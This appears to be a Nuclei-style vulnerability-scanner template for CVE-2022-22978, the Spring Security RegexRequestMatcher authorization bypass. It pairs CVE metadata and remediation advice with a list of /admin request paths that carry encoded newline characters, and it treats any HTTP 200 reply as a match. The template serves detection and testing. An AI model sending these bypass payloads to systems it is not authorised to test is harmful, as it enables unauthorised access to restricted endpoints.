id: CVE-2022-22978

info:
  name: Spring Security RegexRequestMatcher Authorization Bypass
  author: Sumanth Vankineni
  severity: critical
  description: |
    In Spring Security versions prior to 5.4.11, 5.5.7, 5.6.4, and older unsupported versions, RegexRequestMatcher can easily be misconfigured to be bypassed on some servlet containers. Applications using RegexRequestMatcher with `.` in the regular expression are possibly vulnerable to an authorization bypass.
  impact: |
    Successful exploitation of this vulnerability allows an attacker to bypass authorization checks and access restricted endpoints.
  remediation: |
    Upgrade to Spring Security version 5.4.11, 5.5.7, 5.6.4, or later to mitigate this vulnerability.
  reference:
    - https://tanzu.vmware.com/security/cve-2022-22978
    - https://github.com/DeEpinGh0st/CVE-2022-22978
    - https://snyk.io/blog/spring-security-authorization-bypass-cve-2022-31692/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-22978
    cwe-id: CWE-287
    epss-score: 0.89
    epss-percentile: 0.99
    cpe: cpe:2.3:a:pivotal_software:spring_security:*:*:*:*:*:*:*:*

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/%0atest"
      - "{{BaseURL}}/admin/%0dtest"
      - "{{BaseURL}}/admin/index%0a"
      - "{{BaseURL}}/admin/index%0d"
      - "{{BaseURL}}/admin/%0aindex"
      - "{{BaseURL}}/admin/%0dindex"
      - "{{BaseURL}}/admin/%0atest.html"
      - "{{BaseURL}}/admin/%0dtest.html"
      - "{{BaseURL}}/admin/%0a.jsp"
      - "{{BaseURL}}/admin/%0d.jsp"
      - "{{BaseURL}}/admin/.%0a"
      - "{{BaseURL}}/admin/.%0d"
      - "{{BaseURL}}/admin/test/%0a"
      - "{{BaseURL}}/admin/test/%0d"
      - "{{BaseURL}}/admin/dashboard/%0a"
      - "{{BaseURL}}/admin/dashboard/%0d"
      - "{{BaseURL}}/admin/config/%0a"
      - "{{BaseURL}}/admin/config/%0d"
      - "{{BaseURL}}/admin/settings/%0a"
      - "{{BaseURL}}/admin/settings/%0d"
      - "{{BaseURL}}/admin/secure/%0a"
      - "{{BaseURL}}/admin/secure/%0d"
    stop-at-first-match: true
    matchers:
      - type: status
        status:
          - 200
